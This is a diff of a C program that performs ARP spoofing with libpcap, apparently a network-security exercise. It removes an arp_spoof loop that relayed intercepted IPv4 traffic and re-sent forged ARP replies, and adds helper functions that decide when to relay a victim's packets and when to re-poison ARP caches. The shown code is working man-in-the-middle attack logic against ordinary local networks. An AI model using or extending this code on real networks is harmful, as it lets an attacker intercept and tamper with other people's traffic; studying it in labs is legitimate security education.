@@ -62,18 +62,18 @@ void make_arp_packet(uint8_t *targetM, uint8_t *srcM, int op, uint32_t senderIP,
     packet->arp.opcode=htons(op);
 
     memcpy(packet->arp.sender_mac, srcM, sizeof(packet->arp.sender_mac));
-    if(op==1) // ARP request, target == broadcast
+    if(op==1) { // ARP request, target == broadcast
         memcpy(packet->arp.target_mac, "\x00\x00\x00\x00\x00\x00", sizeof(packet->arp.target_mac));
-    if(op==2) // ARP reply
+    }
+    if(op==2) { // ARP reply
         memcpy(packet->arp.target_mac, targetM, sizeof(packet->arp.target_mac));
-
+    }
     packet->arp.sender_ip = senderIP;
     packet->arp.target_ip = targetIP;
 
 }
 
 void check_arp_reply(pcap_t* handle, pcap_pkthdr* header, uint32_t ip, const u_char * rep, Session * session, int s_or_t){
-    //rep = (u_char *)malloc(1600);
     ARP_Packet * arp_packet;
     while(1){ //check correct arp reply
         pcap_next_ex(handle, &header, &rep);
@@ -121,42 +121,21 @@ void find_MAC(pcap_t* handle, pcap_pkthdr *header, int session_num, const u_char
     }
 }
 
-void * arp_spoof(void *data){
-    Attack_arg * args = (Attack_arg *)data;
-    while(1){
-        pcap_next_ex(args->handle, &args->header, &args->real_pkt);
-        // relay check
-        Packet * pkt = (Packet *)args->real_pkt;
-        if(ntohs(pkt->eth.ether_type) == 0x0800){ // if IPv4(relay need)
-            if((memcmp(pkt->eth.src_MAC, args->sess->sender_mac,sizeof(pkt->eth.src_MAC))==0)&&
-            (pkt->ip.dst_ip == args->attacker_ip)){
-                memcpy(pkt->eth.src_MAC, args->attacker_mac, sizeof(args->attacker_mac));
-                memcpy(pkt->eth.dst_MAC, args->sess->target_mac, sizeof(args->sess->target_mac));
-            }
-            if(pcap_sendpacket(args->handle, args->real_pkt, args->header->len)!=0) {
-                printf("[-] Error in arp_spoof, relay failed\n");
-                exit(1);
-            }
-            printf("[+] Success relay\n");
-        }
-        if(ntohs(pkt->eth.ether_type) == 0x0806){
-            ARP_Packet * arp_pkt = (ARP_Packet *)args->real_pkt;
-            if(memcmp(arp_pkt->eth.src_MAC, args->sess->target_mac, sizeof(arp_pkt->eth.src_MAC))==0 &&
-            arp_pkt->arp.sender_ip == args->sess->target_ip){
-                if(pcap_sendpacket(args->handle, args->spoofed_pkt, args->header->len)!=0) {
-                    printf("[-] Error in arp_spoof, send arp spoofed pkt failed\n");
-                    exit(1);
-                }
-            }
-            if((ntohs(arp_pkt->arp.opcode) == 2) && 
-            memcmp(arp_pkt->eth.src_MAC, args->sess->sender_mac, sizeof(uint8_t)*6)==0 &&
-            arp_pkt->arp.target_ip==args->sess->target_ip){
-                if(pcap_sendpacket(args->handle, args->spoofed_pkt, args->header->len)!=0) {
-                    printf("[-] Error in arp_spoof, send arp spoofed pkt failed\n");
-                    exit(1);
-                }
-            }
-            printf("[+] Success to send arp spoofed pkt\n");
-        }
+bool check_relay(Session * sess, uint32_t attacker_ip, Packet * pkt){
+    bool ret = false;
+    if((memcmp(pkt->eth.src_MAC, sess->sender_mac, sizeof(uint8_t)*6) == 0) && (pkt->ip.dst_ip != attacker_ip)){
+        ret = true;
     }
+    return ret;
+}
+
+bool check_arp_attack(Session * sess, ARP_Packet * pkt){
+    bool ret = false;
+    if((pkt->arp.sender_ip == sess->target_ip) && (memcmp(pkt->arp.sender_mac, sess->target_mac, sizeof(uint8_t)*6) == 0)){
+        ret = true;
+    }
+    if((ntohs(pkt->arp.opcode) == 1) && (memcmp(pkt->arp.sender_mac, sess->sender_mac, sizeof(uint8_t)*6) == 0)){
+        ret = true;
+    }
+    return ret;
 }
